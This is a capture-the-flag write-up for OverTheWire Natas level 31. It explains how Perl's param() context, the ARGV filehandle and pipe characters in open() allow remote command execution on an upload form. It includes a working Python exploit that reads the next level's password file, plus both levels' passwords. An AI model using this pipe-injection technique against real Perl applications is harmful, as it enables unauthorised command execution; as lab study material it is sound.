---
category: natas
title: Natas31 - RCE (Remote Code Execution)
---

website: http://natas31.natas.labs.overthewire.org/ (password: hay7aecuungiuKaezuathuk9biin0pu1)

In this challenge, a user can upload a csv datasheet and the web application will translate it into an HTML table. From the source code, we can see it's a Perl CGI. The major part is attached below:

```perl
my $file = $cgi->param('file');
...
while (<$file>) {
...
}
```

As we can see, this CGI reads the uploaded csv file content. In the previous level, we already learned that the `param()` is context sensitive, which means it can return either the first element or all elements in an array.
In this case, because `$file` is a scalar variable, `param()` will return the first element only.
If we pass in an array to the 'file' in the form, in which the first element is a string, then the `$file` variable will be a string.

From <a href="https://www.youtube.com/watch?v=BYl3-c2JSL8">this video</a>, a few other Perl vulnerabilities were mentioned as well:

1. The `while (<$file>)` must be a file descriptor. It cannot be a string unless the string is "ARGV". If that is the case, then all the parameters in the URL will be sent to the `open()`. That means we can send a drafted string to `open()`.
2. If the string contains a pipe symbol (i.e., the character "\|"), then `open()` will cosider it as a command and actually execute the command. This makes RCE (Remote Code Execution) possible.

Given that in mind, I came up with a solution which injects a command into the CGI. The solution is provided below:

```python
#!/usr/bin/env python3
import requests
 
auth = ('natas31', 'hay7aecuungiuKaezuathuk9biin0pu1')
base_url = 'http://natas31.natas.labs.overthewire.org/index.pl'
 
# Inject our command as a parameter in the URL.
# The symbol "|" ensures that open() executes the command.
url = base_url + '?cat+/etc/natas_webpass/natas32+|'
 
# Feed the $file with a string "ARGV".
# This ensures that our command will be injected.
data = {'file': 'ARGV'}
 
# This is a real csv file we will upload.
files = {'file': open('natas31.csv', 'r')}
resp = requests.post(url, auth=auth, data=data, files=files)
print(resp.text)
```

The password was returned in the response as a table header: <small>no1vohsheCaiv3ieH4em1ahchisainge</small>.

<strong>Reference</strong>

This challenge is about Remote Code Execution in web application. Please refer to references below for more details:
1.    The <a href="https://www.youtube.com/watch?v=BYl3-c2JSL8">video</a> and <a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">slides</a> in BlackHat 2016.
2.    To send a file as a form data using curl, you can use this command: `curl -u natas31:hay7aecuungiuKaezuathuk9biin0pu1 "http://natas31.natas.labs.overthewire.org/index.pl" -F "submit=Upload" -F "file=@natas31.csv;type=text/csv"`


